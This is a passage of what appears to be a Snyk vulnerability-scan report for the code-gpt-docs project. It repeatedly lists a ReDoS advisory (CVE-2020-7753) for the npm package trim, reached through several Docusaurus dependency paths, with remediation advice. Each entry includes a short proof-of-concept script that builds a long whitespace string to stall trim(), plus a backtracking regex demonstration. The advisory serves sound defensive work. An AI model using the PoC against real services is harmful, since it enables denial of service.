ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-debug@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-google-analytics@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, 